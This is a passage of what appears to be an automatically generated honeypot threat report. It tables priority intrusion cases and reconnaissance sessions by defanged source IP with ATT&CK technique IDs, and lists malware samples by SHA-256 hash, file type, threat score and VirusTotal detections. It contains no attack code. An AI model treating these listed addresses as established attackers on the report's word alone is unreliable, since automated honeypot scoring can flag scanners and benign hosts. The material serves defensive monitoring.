| IR-ea0a2a169e9c | HIGH | `138.226.239[.]233` | 2026-10-29 06:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f6e0c94dedc6 | HIGH | `112.216.120[.]67` | 2026-10-29 06:26 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-19a9c1a66e76 | HIGH | `112.216.120[.]67` | 2026-10-29 06:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b6b3123a13b3 | HIGH | `168.205.190[.]245` | 2026-10-29 06:32 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0ce4d06706f1 | HIGH | `168.205.190[.]245` | 2026-10-29 06:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b937a3cf42b2 | HIGH | `152.32.230[.]104` | 2026-10-29 06:33 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-356926e1830c | HIGH | `152.32.230[.]104` | 2026-10-29 06:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f12fec9f88cc | HIGH | `152.32.236[.]102` | 2026-10-29 06:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7f20e21bb04d | HIGH | `34.140.183[.]79` | 2026-10-29 06:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-aed2959aeb59 | HIGH | `66.228.53[.]162` | 2026-10-29 06:42 | Y | 3 | 0 | `T1078` |
| IR-5efbd4c6ac01 | HIGH | `4.184.246[.]230` | 2026-10-29 06:51 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-eaff07d55bb0 | HIGH | `4.184.246[.]230` | 2026-10-29 06:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-eae9ec2c4df6 | HIGH | `52.237.80[.]79` | 2026-10-29 06:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1c04ad938780 | HIGH | `52.237.80[.]79` | 2026-10-29 06:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e127794ce9d8 | HIGH | `201.17.133[.]138` | 2026-10-29 06:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f669a59e9b9e | HIGH | `201.17.133[.]138` | 2026-10-29 06:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-92ff8d8d74ea | HIGH | `219.77.169[.]219` | 2026-10-29 06:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ccefccf9335a | HIGH | `219.77.169[.]219` | 2026-10-29 06:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5605c8d304fe | HIGH | `103.163.118[.]115` | 2026-10-29 06:54 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-332f2a999c2e | HIGH | `103.163.118[.]115` | 2026-10-29 06:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-248836a07d13 | HIGH | `165.154.162[.]74` | 2026-10-29 06:54 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7ce0815c0879 | HIGH | `165.154.162[.]74` | 2026-10-29 06:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-427d07b0fd87 | HIGH | `119.92.70[.]82` | 2026-10-29 06:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fe3c3e2578d2 | HIGH | `119.92.70[.]82` | 2026-10-29 06:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ce99761f1c7e | HIGH | `103.194.243[.]199` | 2026-10-29 07:00 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-30b06e0b8ad1 | HIGH | `103.194.243[.]199` | 2026-10-29 07:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7badd4e210ed | HIGH | `101.36.108[.]72` | 2026-10-29 07:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0b7e61f8a18f | HIGH | `101.36.108[.]72` | 2026-10-29 07:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0f73178a85e8 | HIGH | `201.138.144[.]42` | 2026-10-29 07:03 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6acbff32e9b9 | HIGH | `201.138.144[.]42` | 2026-10-29 07:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3289f0d1184a | HIGH | `113.140.0[.]186` | 2026-10-29 07:03 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f2b096680c5c | HIGH | `113.140.0[.]186` | 2026-10-29 07:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-98ae9a4ff2ec | HIGH | `189.50.142[.]78` | 2026-10-29 07:15 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8cc97412bbf4 | HIGH | `189.50.142[.]78` | 2026-10-29 07:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7eb767e900f9 | HIGH | `114.66.42[.]35` | 2026-10-29 07:19 | Y | 20 | 1 | `T1021.004 · T1053.003 · T1057` |
| IR-0650a56d30f1 | HIGH | `125.162.166[.]62` | 2026-10-29 07:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6981fab602fd | HIGH | `125.162.166[.]62` | 2026-10-29 07:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8fae11051a7e | HIGH | `110.226.114[.]131` | 2026-10-29 07:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-dc4d9c71c9ca | HIGH | `110.226.114[.]131` | 2026-10-29 07:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0ec603f6ae9d | HIGH | `103.255.200[.]90` | 2026-10-29 07:44 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-b52201eed2ff | HIGH | `80.94.92[.]234` | 2026-10-29 07:44 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-ef588458e5e3 | HIGH | `103.255.200[.]90` | 2026-10-29 07:44 | Y | 0 | 0 | `T1078 · T1592` |
_… 169 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `143.198.208[.]150` | **4** | 2026-10-29 07:37 | 2026-10-29 12:20 | 4m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **3** | 2026-10-29 11:57 | 2026-10-29 14:11 | 4m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **3** | 2026-10-29 03:18 | 2026-10-29 06:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **3** | 2026-10-29 08:24 | 2026-10-29 12:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `118.47.77[.]183` | **2** | 2026-10-29 03:58 | 2026-10-29 04:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-10-29 03:28 | 2026-10-29 04:25 | 1m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-10-29 06:39 | 2026-10-29 08:27 | 1m | 0 | `T1592` | 🟢 LOW |
| `138.68.53[.]50` | **2** | 2026-10-29 07:42 | 2026-10-29 09:07 | 2m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-29 14:25 | 2026-10-29 16:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.85.233[.]155` | **2** | 2026-10-29 06:46 | 2026-10-29 08:03 | 4m | 0 | `T1592` | 🟢 LOW |
| `203.203.86[.]235` | **2** | 2026-10-29 15:32 | 2026-10-29 16:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | **2** | 2026-10-29 07:40 | 2026-10-29 08:06 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `1.36.201[.]199` | 1 | 2026-10-29 11:09 | 2026-10-29 11:10 | 14s | 0 | `T1592` | 🟢 LOW |
| `103.242.217[.]61` | 1 | 2026-10-29 15:15 | 2026-10-29 15:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.242.217[.]62` | 1 | 2026-10-29 15:16 | 2026-10-29 15:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.12.84[.]220` | 1 | 2026-10-29 06:38 | 2026-10-29 06:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]170` | 1 | 2026-10-29 14:30 | 2026-10-29 14:31 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.194.163[.]49` | 1 | 2026-10-29 13:25 | 2026-10-29 13:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `110.42.49[.]242` | 1 | 2026-10-29 14:17 | 2026-10-29 14:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `110.53.97[.]49` | 1 | 2026-10-29 08:44 | 2026-10-29 08:44 | 2s | 0 | `T1592` | 🟢 LOW |
| `111.42.183[.]124` | 1 | 2026-10-29 05:09 | 2026-10-29 05:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.66.42[.]35` | 1 | 2026-10-29 07:19 | 2026-10-29 07:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.229[.]67` | 1 | 2026-10-29 08:34 | 2026-10-29 08:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.253[.]92` | 1 | 2026-10-29 05:15 | 2026-10-29 05:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.191.61[.]164` | 1 | 2026-10-29 03:09 | 2026-10-29 03:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.23.48[.]47` | 1 | 2026-10-29 15:42 | 2026-10-29 15:42 | 13s | 0 | `T1592` | 🟢 LOW |
| `117.34.125[.]173` | 1 | 2026-10-29 05:06 | 2026-10-29 05:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.34.125[.]173` | 1 | 2026-10-29 10:08 | 2026-10-29 10:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.72.146[.]14` | 1 | 2026-10-29 15:54 | 2026-10-29 15:54 | 1s | 0 | `T1592` | 🟢 LOW |
| `118.145.228[.]55` | 1 | 2026-10-29 03:53 | 2026-10-29 03:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.179.46[.]246` | 1 | 2026-10-29 11:46 | 2026-10-29 11:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `118.186.18[.]243` | 1 | 2026-10-29 11:57 | 2026-10-29 11:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.86[.]5` | 1 | 2026-10-29 03:53 | 2026-10-29 03:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.96.173[.]169` | 1 | 2026-10-29 11:58 | 2026-10-29 12:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.38[.]253` | 1 | 2026-10-29 16:28 | 2026-10-29 16:29 | 87s | 0 | `T1592` | 🟢 LOW |
| `120.48.44[.]127` | 1 | 2026-10-29 15:04 | 2026-10-29 15:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.139.211[.]160` | 1 | 2026-10-29 14:53 | 2026-10-29 14:53 | 22s | 0 | `T1592` | 🟢 LOW |
| `121.142.204[.]4` | 1 | 2026-10-29 12:45 | 2026-10-29 12:46 | 29s | 0 | `T1592` | 🟢 LOW |
| `123.122.44[.]40` | 1 | 2026-10-29 06:00 | 2026-10-29 06:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.56.11[.]51` | 1 | 2026-10-29 10:36 | 2026-10-29 10:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.6.229[.]172` | 1 | 2026-10-29 09:47 | 2026-10-29 09:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `128.201.187[.]183` | 1 | 2026-10-29 05:45 | 2026-10-29 05:45 | 26s | 0 | `T1592` | 🟢 LOW |
| `138.255.178[.]214` | 1 | 2026-10-29 08:26 | 2026-10-29 08:26 | 14s | 0 | `T1592` | 🟢 LOW |
| `138.68.53[.]50` | 1 | 2026-10-29 04:57 | 2026-10-29 04:58 | 25s | 0 | `T1592` | 🟢 LOW |
| `138.68.53[.]50` | 1 | 2026-10-29 16:42 | 2026-10-29 16:43 | 73s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]197` | 1 | 2026-10-29 11:55 | 2026-10-29 11:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.44.31[.]59` | 1 | 2026-10-29 09:40 | 2026-10-29 09:41 | 27s | 0 | `T1592` | 🟢 LOW |
| `140.249.189[.]35` | 1 | 2026-10-29 10:16 | 2026-10-29 10:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-10-29 03:50 | 2026-10-29 03:51 | 94s | 0 | `T1592` | 🟢 LOW |
| `151.243.11[.]149` | 1 | 2026-10-29 08:48 | 2026-10-29 08:48 | 3s | 0 | `T1592` | 🟢 LOW |
| `151.243.11[.]151` | 1 | 2026-10-29 08:48 | 2026-10-29 08:48 | 4s | 0 | `T1592` | 🟢 LOW |
| `152.170.181[.]194` | 1 | 2026-10-29 11:02 | 2026-10-29 11:02 | 3s | 0 | `T1592` | 🟢 LOW |
| `157.90.113[.]31` | 1 | 2026-10-29 16:06 | 2026-10-29 16:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `158.181.16[.]165` | 1 | 2026-10-29 14:58 | 2026-10-29 14:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `159.69.142[.]108` | 1 | 2026-10-29 14:24 | 2026-10-29 14:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `164.90.186[.]143` | 1 | 2026-10-29 14:30 | 2026-10-29 14:30 | 20s | 0 | `T1592` | 🟢 LOW |
| `165.22.84[.]85` | 1 | 2026-10-29 14:29 | 2026-10-29 14:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `170.231.236[.]98` | 1 | 2026-10-29 06:38 | 2026-10-29 06:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.202.119[.]34` | 1 | 2026-10-29 06:35 | 2026-10-29 06:35 | 22s | 0 | `T1592` | 🟢 LOW |
| `176.98.155[.]63` | 1 | 2026-10-29 03:30 | 2026-10-29 03:31 | 13s | 0 | `T1592` | 🟢 LOW |
| `177.125.93[.]145` | 1 | 2026-10-29 13:26 | 2026-10-29 13:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.134.233[.]40` | 1 | 2026-10-29 05:26 | 2026-10-29 05:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-10-29 16:37 | 2026-10-29 16:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.97.5[.]25` | 1 | 2026-10-29 14:00 | 2026-10-29 14:00 | 5s | 0 | `T1592` | 🟢 LOW |
| `180.76.185[.]216` | 1 | 2026-10-29 16:16 | 2026-10-29 16:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.188[.]13` | 1 | 2026-10-29 05:05 | 2026-10-29 05:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.233[.]177` | 1 | 2026-10-29 05:07 | 2026-10-29 05:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.93.193[.]100` | 1 | 2026-10-29 10:25 | 2026-10-29 10:26 | 51s | 0 | `T1592` | 🟢 LOW |
| `181.78.9[.]203` | 1 | 2026-10-29 06:30 | 2026-10-29 06:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `181.80.25[.]80` | 1 | 2026-10-29 03:32 | 2026-10-29 03:32 | 13s | 0 | `T1592` | 🟢 LOW |
| `182.44.11[.]243` | 1 | 2026-10-29 06:56 | 2026-10-29 06:58 | 96s | 0 | `T1592` | 🟢 LOW |
| `182.44.6[.]221` | 1 | 2026-10-29 02:55 | 2026-10-29 02:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.232.212[.]207` | 1 | 2026-10-29 10:08 | 2026-10-29 10:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.233.149[.]100` | 1 | 2026-10-29 09:43 | 2026-10-29 09:44 | 93s | 0 | `T1592` | 🟢 LOW |
| `185.191.236[.]38` | 1 | 2026-10-29 06:38 | 2026-10-29 06:38 | 2s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]36` | 1 | 2026-10-29 11:29 | 2026-10-29 11:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `188.232.218[.]26` | 1 | 2026-10-29 08:46 | 2026-10-29 08:47 | 13s | 0 | `T1592` | 🟢 LOW |
| `189.219.67[.]159` | 1 | 2026-10-29 11:02 | 2026-10-29 11:02 | 9s | 0 | `T1592` | 🟢 LOW |
| `189.89.93[.]254` | 1 | 2026-10-29 13:40 | 2026-10-29 13:40 | 13s | 0 | `T1592` | 🟢 LOW |
| `190.247.37[.]104` | 1 | 2026-10-29 07:27 | 2026-10-29 07:27 | 12s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-29 10:50 | 2026-10-29 10:50 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.8.186[.]29` | 1 | 2026-10-29 16:21 | 2026-10-29 16:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.44.33[.]47` | 1 | 2026-10-29 03:24 | 2026-10-29 03:25 | 13s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]218` | 1 | 2026-10-29 03:21 | 2026-10-29 03:21 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.14.76[.]13` | 1 | 2026-10-29 14:33 | 2026-10-29 14:34 | 9s | 0 | `T1592` | 🟢 LOW |
| `20.163.35[.]246` | 1 | 2026-10-29 09:28 | 2026-10-29 09:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.80.92[.]163` | 1 | 2026-10-29 16:47 | 2026-10-29 16:48 | 10s | 0 | `T1592` | 🟢 LOW |
| `203.86.122[.]158` | 1 | 2026-10-29 08:15 | 2026-10-29 08:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.185.14[.]39` | 1 | 2026-10-29 08:51 | 2026-10-29 08:52 | 27s | 0 | `T1592` | 🟢 LOW |
| `211.185.81[.]26` | 1 | 2026-10-29 06:10 | 2026-10-29 06:11 | 22s | 0 | `T1592` | 🟢 LOW |
| `216.226.76[.]10` | 1 | 2026-10-29 14:53 | 2026-10-29 14:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `216.229.120[.]205` | 1 | 2026-10-29 06:42 | 2026-10-29 06:42 | 1s | 0 | `T1592` | 🟢 LOW |
| `218.103.235[.]73` | 1 | 2026-10-29 04:13 | 2026-10-29 04:13 | 30s | 0 | `T1592` | 🟢 LOW |
| `218.152.243[.]192` | 1 | 2026-10-29 12:49 | 2026-10-29 12:50 | 16s | 0 | `T1592` | 🟢 LOW |
| `219.150.93[.]157` | 1 | 2026-10-29 13:15 | 2026-10-29 13:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `220.250.52[.]111` | 1 | 2026-10-29 03:52 | 2026-10-29 03:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `223.123.16[.]151` | 1 | 2026-10-29 05:27 | 2026-10-29 05:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-10-29 10:07 | 2026-10-29 10:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.140.183[.]79` | 1 | 2026-10-29 06:36 | 2026-10-29 06:36 | 6s | 0 | `T1592` | 🟢 LOW |
| `35.241.212[.]101` | 1 | 2026-10-29 06:37 | 2026-10-29 06:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `36.134.69[.]15` | 1 | 2026-10-29 07:40 | 2026-10-29 07:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `38.110.46[.]236` | 1 | 2026-10-29 15:40 | 2026-10-29 15:41 | 60s | 0 | `T1592` | 🟢 LOW |
| `39.98.202[.]253` | 1 | 2026-10-29 11:51 | 2026-10-29 11:51 | 1s | 0 | `T1592` | 🟢 LOW |
| `40.124.187[.]33` | 1 | 2026-10-29 09:02 | 2026-10-29 09:02 | 9s | 0 | `T1592` | 🟢 LOW |
| `40.124.187[.]35` | 1 | 2026-10-29 16:10 | 2026-10-29 16:10 | 10s | 0 | `T1592` | 🟢 LOW |
| `42.51.32[.]228` | 1 | 2026-10-29 05:18 | 2026-10-29 05:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-10-29 07:05 | 2026-10-29 07:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-10-29 10:03 | 2026-10-29 10:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-10-29 16:05 | 2026-10-29 16:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-10-29 03:57 | 2026-10-29 03:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-10-29 09:03 | 2026-10-29 09:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.169.98[.]90` | 1 | 2026-10-29 09:16 | 2026-10-29 09:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `60.214.154[.]254` | 1 | 2026-10-29 11:51 | 2026-10-29 11:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]167` | 1 | 2026-10-29 04:50 | 2026-10-29 04:50 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-10-29 08:15 | 2026-10-29 08:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]142` | 1 | 2026-10-29 11:42 | 2026-10-29 11:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]103` | 1 | 2026-10-29 06:36 | 2026-10-29 06:36 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]105` | 1 | 2026-10-29 04:32 | 2026-10-29 04:32 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]131` | 1 | 2026-10-29 08:33 | 2026-10-29 08:34 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]198` | 1 | 2026-10-29 08:34 | 2026-10-29 08:34 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]208` | 1 | 2026-10-29 06:37 | 2026-10-29 06:37 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]176` | 1 | 2026-10-29 06:37 | 2026-10-29 06:37 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]182` | 1 | 2026-10-29 03:55 | 2026-10-29 03:55 | 3s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]63` | 1 | 2026-10-29 04:23 | 2026-10-29 04:23 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]70` | 1 | 2026-10-29 08:33 | 2026-10-29 08:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]162` | 1 | 2026-10-29 06:42 | 2026-10-29 06:42 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-10-29 05:41 | 2026-10-29 05:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.6.146[.]186` | 1 | 2026-10-29 14:31 | 2026-10-29 14:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `75.117.95[.]156` | 1 | 2026-10-29 10:59 | 2026-10-29 10:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `76.139.230[.]81` | 1 | 2026-10-29 16:12 | 2026-10-29 16:12 | 14s | 0 | `T1592` | 🟢 LOW |
| `76.242.50[.]73` | 1 | 2026-10-29 05:16 | 2026-10-29 05:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-29 03:21 | 2026-10-29 03:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]146` | 1 | 2026-10-29 16:17 | 2026-10-29 16:17 | 8s | 0 | `T1592` | 🟢 LOW |
| `78.128.114[.]118` | 1 | 2026-10-29 09:52 | 2026-10-29 09:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]0` | 1 | 2026-10-29 13:40 | 2026-10-29 13:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]51` | 1 | 2026-10-29 13:41 | 2026-10-29 13:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.38.187[.]188` | 1 | 2026-10-29 12:38 | 2026-10-29 12:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]176` | 1 | 2026-10-29 07:02 | 2026-10-29 07:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.217.242[.]122` | 1 | 2026-10-29 14:17 | 2026-10-29 14:17 | 13s | 0 | `T1592` | 🟢 LOW |
| `91.102.177[.]61` | 1 | 2026-10-29 12:57 | 2026-10-29 12:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.239.95[.]19` | 1 | 2026-10-29 13:15 | 2026-10-29 13:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]49` | 1 | 2026-10-29 04:49 | 2026-10-29 04:49 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.118.39[.]49` | 1 | 2026-10-29 13:00 | 2026-10-29 13:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]71` | 1 | 2026-10-29 10:18 | 2026-10-29 10:18 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `95.86.168[.]168` | 1 | 2026-10-29 04:20 | 2026-10-29 04:20 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
